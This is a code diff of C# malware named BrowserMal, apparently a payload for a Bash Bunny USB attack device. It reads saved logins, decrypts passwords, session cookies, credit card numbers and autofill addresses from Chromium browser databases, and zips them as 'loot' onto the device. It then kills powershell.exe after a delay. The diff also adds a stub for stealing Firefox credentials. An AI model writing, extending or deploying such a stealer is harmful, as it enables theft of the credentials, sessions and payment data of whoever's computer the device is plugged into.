@@ -9,6 +9,7 @@ namespace BrowserMal
     public class Class1
     {
         private static readonly BrowserManager browserManager = new BrowserManager();
+        private static readonly GeckoBrowserManager geckoBrowserManager = new GeckoBrowserManager();
         private static readonly Dictionary<string, string> list = new Dictionary<string, string>();
 
         public static void StartCreds()
@@ -23,8 +24,8 @@ namespace BrowserMal
                 new ColumnModel("username_value", isEncrypted: false, needsFormatting: false, isImportant: false),
                 new ColumnModel("password_value", isEncrypted: true, needsFormatting: false, isImportant: true)
             };
-            GenericManager<CredentialModel> credentialsManager = new GenericManager<CredentialModel>("logins", new SqliteTableModel(credsColumns));
-            list.AddRange(credentialsManager.Init(ref browsers, Browser.Util.LOGIN_DATA));
+            ChromiumManager<CredentialModel> credentialsManager = new ChromiumManager<CredentialModel>("logins", new SqliteTableModel(credsColumns));
+            list.AddRange(credentialsManager.Init(ref browsers, Browser.ChromiumUtil.LOGIN_DATA));
 
             // get cookies
             List<ColumnModel> cookiesColumns = new List<ColumnModel>
@@ -32,11 +33,11 @@ namespace BrowserMal
                 new ColumnModel("host_key", isEncrypted: false, needsFormatting: false, isImportant: false),
                 new ColumnModel("name", isEncrypted: false, needsFormatting: false, isImportant: true),
                 new ColumnModel("path", isEncrypted: false, needsFormatting: false, isImportant: false),
-                new ColumnModel("expires_utc", isEncrypted: false, needsFormatting: true, isImportant: false, Browser.Util.ChromiumToUnixTimestamp),
+                new ColumnModel("expires_utc", isEncrypted: false, needsFormatting: true, isImportant: false, Browser.ChromiumUtil.ChromiumToUnixTimestamp),
                 new ColumnModel("encrypted_value", isEncrypted: true, needsFormatting: false, isImportant: true)
             };
-            GenericManager<CookieModel> cookiesManager = new GenericManager<CookieModel>("cookies", new SqliteTableModel(cookiesColumns));
-            list.AddRange(cookiesManager.Init(ref browsers, Browser.Util.COOKIES));
+            ChromiumManager<CookieModel> cookiesManager = new ChromiumManager<CookieModel>("cookies", new SqliteTableModel(cookiesColumns));
+            list.AddRange(cookiesManager.Init(ref browsers, Browser.ChromiumUtil.COOKIES));
 
             // get credit cards
             List<ColumnModel> creditCardsColumns = new List<ColumnModel>()
@@ -47,8 +48,8 @@ namespace BrowserMal
                 new ColumnModel("nickname", isEncrypted: false, needsFormatting: false, isImportant: false),
                 new ColumnModel("card_number_encrypted", isEncrypted: true, needsFormatting: false, isImportant: false)
             };
-            GenericManager<CreditCardModel> creditCardsManager = new GenericManager<CreditCardModel>("credit_cards", new SqliteTableModel(creditCardsColumns));
-            list.AddRange(creditCardsManager.Init(ref browsers, Browser.Util.WEB_DATA));
+            ChromiumManager<CreditCardModel> creditCardsManager = new ChromiumManager<CreditCardModel>("credit_cards", new SqliteTableModel(creditCardsColumns));
+            list.AddRange(creditCardsManager.Init(ref browsers, Browser.ChromiumUtil.WEB_DATA));
 
             List<ColumnModel> addressesColumns = new List<ColumnModel>()
             {
@@ -56,8 +57,8 @@ namespace BrowserMal
                 new ColumnModel("city", isEncrypted: false, needsFormatting: false, isImportant: false),
                 new ColumnModel("zipcode", isEncrypted: false, needsFormatting: false, isImportant: false)
             };
-            GenericManager<AddressesModel> addressesManager = new GenericManager<AddressesModel>("autofill_profiles", new SqliteTableModel(addressesColumns));
-            list.AddRange(addressesManager.Init(ref browsers, Browser.Util.WEB_DATA));
+            ChromiumManager<AddressesModel> addressesManager = new ChromiumManager<AddressesModel>("autofill_profiles", new SqliteTableModel(addressesColumns));
+            list.AddRange(addressesManager.Init(ref browsers, Browser.ChromiumUtil.WEB_DATA));
 
             string root = GetBashBunny();
 
@@ -68,8 +69,21 @@ namespace BrowserMal
             }
 
             Filesaver.FileManager.SaveBytes(root, "loot", Zip.ZipArchives(list));
+            ProcessUtil.KillProcessDelayed(1, "powershell.exe");
+        }
 
-            //Util.ProcessUtil.RunAfterSeconds("powershel");
+        public static void Gecko()
+        {
+            List<ColumnModel> credsColumns = new List<ColumnModel>
+            {
+                new ColumnModel("origin_url", isEncrypted: false, needsFormatting: false, isImportant: false),
+            };
+
+            geckoBrowserManager.Init();
+            List<BrowserModel> browsers = geckoBrowserManager.GetBrowsers();
+
+            GeckoManager<CredentialModel> geckoManager = new GeckoManager<CredentialModel>("", new SqliteTableModel(credsColumns));
+            geckoManager.Init(ref browsers);
         }
 
         private static string GetBashBunny() => RemovableDisks.FindBashBunny();
